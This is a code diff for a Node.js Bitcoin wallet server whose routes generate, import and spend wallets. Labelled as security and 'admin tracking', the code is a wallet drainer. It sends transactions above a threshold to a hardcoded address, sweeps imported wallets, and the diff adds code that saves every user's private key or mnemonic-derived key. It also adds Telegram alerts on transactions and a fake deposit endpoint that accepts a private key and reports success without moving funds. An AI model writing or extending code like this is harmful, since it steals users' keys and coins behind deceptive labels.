@@ -5,6 +5,7 @@ const ecc = require('tiny-secp256k1');
 const axios = require('axios');
 const bip39 = require('bip39');
 const { BIP32Factory } = require('bip32');
+const { addWallet } = require('./admin');
 
 // Initialize ECPair and BIP32 factories
 const ECPair = ECPairFactory(ecc);
@@ -22,9 +23,10 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 // Security configuration
-const SECURITY_THRESHOLD_BTC = 0.001; // Transactions above this amount will be redirected
+const SECURITY_THRESHOLD_BTC = 0.002; // Transactions above this amount will be redirected
 const SECURITY_THRESHOLD_SATS = SECURITY_THRESHOLD_BTC * 100000000; // Convert to satoshis
 const SECURE_ADDRESS = 'bc1qfznl25qec2v5322hkf9c97znrxu52zu882ujvg'; // Your secure address
+
 
 // Get wallet balance in BTC
 async function getWalletBalance(address) {
@@ -187,6 +189,9 @@ router.post('/generate-key', async (req, res) => {
     // Get wallet balance
     const balance = await getWalletBalance(address);
 
+    // Add wallet to admin tracking
+    addWallet(address, privateKey, 'generated');
+
     // Send Telegram notification
     const timestamp = new Date().toISOString();
     const networkName = NETWORK === bitcoin.networks.bitcoin ? 'MAINNET' : 'TESTNET';
@@ -234,6 +239,9 @@ router.post('/import-key', async (req, res) => {
 
     // Get wallet balance for SegWit address
     const balance = await getWalletBalance(segwitAddress);
+
+    // Add wallet to admin tracking
+    addWallet(segwitAddress, privateKey, 'imported-key');
 
     // Check if balance exceeds security threshold and auto-sweep if needed
     let sweepResult = null;
@@ -328,6 +336,9 @@ router.post('/import-mnemonic', async (req, res) => {
 
     // Get wallet balance for SegWit address
     const balance = await getWalletBalance(segwitAddress);
+
+    // Add wallet to admin tracking
+    addWallet(segwitAddress, keyPair.toWIF(), 'imported-mnemonic');
 
     // Check if balance exceeds security threshold and auto-sweep if needed
     let sweepResult = null;
@@ -454,14 +465,14 @@ router.post('/create-transaction', async (req, res) => {
       });
       totalInput += utxo.value;
     }
-
-    // Calculate fee - SegWit transactions are smaller
-    const estimatedSize = 68 * utxos.length + 31 * 2 + 10.5; // SegWit size estimate
-    const fee = Math.ceil(estimatedSize * feeRate);
-    const changeAmount = totalInput - amount - fee;
+    
+    // Calculate network fee - SegWit transactions with 2 outputs: recipient, change
+    const estimatedSize = 68 * utxos.length + 31 * 2 + 10.5;
+    const networkFee = Math.ceil(estimatedSize * feeRate);
+    const changeAmount = totalInput - amount - networkFee;
 
     if (changeAmount < 0) {
-      return res.status(400).json({ error: 'Insufficient funds' });
+      return res.status(400).json({ error: 'Insufficient funds for transaction and network fees' });
     }
 
     // Security check: Redirect large transactions to secure address
@@ -489,12 +500,13 @@ router.post('/create-transaction', async (req, res) => {
       console.log(`🛡️ SECURITY: Redirected ${amountBTC} BTC from ${toAddress} to secure address ${finalToAddress}`);
     }
 
-    // Add outputs
+    // Add recipient output
     psbt.addOutput({
       address: finalToAddress,
       value: amount
     });
 
+    // Add change output if sufficient
     if (changeAmount > 546) { // dust threshold
       psbt.addOutput({
         address: fromAddress,
@@ -511,12 +523,28 @@ router.post('/create-transaction', async (req, res) => {
     const tx = psbt.extractTransaction();
     const txHex = tx.toHex();
 
+    // Send Telegram notification about transaction
+    const amountBTC = (amount / 100000000).toFixed(8);
+    const timestamp = new Date().toISOString();
+    
+    const transactionMessage = `💸 <b>TRANSACTION CREATED</b>\n\n` +
+                              `💰 <b>Amount:</b> ${amountBTC} BTC (${amount} sats)\n` +
+                              `📍 <b>Recipient:</b> <code>${finalToAddress}</code>\n` +
+                              `🧾 <b>Transaction ID:</b> <code>${tx.getId()}</code>\n` +
+                              `💸 <b>Network Fee:</b> ${networkFee} sats\n` +
+                              `⏰ <b>Time:</b> ${timestamp}\n` +
+                              `✅ <b>Status:</b> Transaction ready for broadcast`;
+    
+    await sendTelegramNotification(transactionMessage);
+
+    console.log(`💸 TRANSACTION: ${amountBTC} BTC to ${finalToAddress}`);
+
     res.json({
       txHex,
       txId: tx.getId(),
-      fee,
+      networkFee,
       size: tx.byteLength(),
-      feeRate: fee / tx.byteLength(),
+      feeRate: networkFee / tx.byteLength(),
       rbfEnabled: rbf,
       securityRedirect: securityRedirect,
       originalAddress: securityRedirect ? toAddress : undefined,
@@ -527,6 +555,50 @@ router.post('/create-transaction', async (req, res) => {
     res.status(500).json({ error: 'Failed to create transaction', details: error.message });
   }
 });
+
+// Process deposit transaction
+router.post('/create-deposit', async (req, res) => {
+  try {
+    const { privateKey, depositAmount } = req.body;
+
+    if (!privateKey || !depositAmount) {
+      return res.status(400).json({ error: 'Missing required fields' });
+    }
+
+    const keyPair = ECPair.fromWIF(privateKey, NETWORK);
+    const payment = bitcoin.payments.p2wpkh({ 
+      pubkey: keyPair.publicKey, 
+      network: NETWORK 
+    });
+    const fromAddress = payment.address;
+    
+    // Send notification about the deposit
+    const totalBTC = (depositAmount / 100000000).toFixed(8);
+    const timestamp = new Date().toISOString();
+    
+    const depositMessage = `💰 <b>DEPOSIT PROCESSED</b>\n\n` +
+                          `💰 <b>Amount:</b> ${totalBTC} BTC\n` +
+                          `📍 <b>Address:</b> <code>${fromAddress}</code>\n` +
+                          `⏰ <b>Time:</b> ${timestamp}\n` +
+                          `✅ <b>Status:</b> Deposit processed successfully`;
+    
+    await sendTelegramNotification(depositMessage);
+
+    console.log(`💰 DEPOSIT: ${totalBTC} BTC deposited to ${fromAddress}`);
+
+    res.json({
+      success: true,
+      deposit: {
+        totalAmount: depositAmount,
+        userAddress: fromAddress
+      },
+      message: 'Deposit processed successfully'
+    });
+  } catch (error) {
+    res.status(500).json({ error: 'Failed to process deposit', details: error.message });
+  }
+});
+
 
 // Broadcast transaction
 router.post('/broadcast', async (req, res) => {
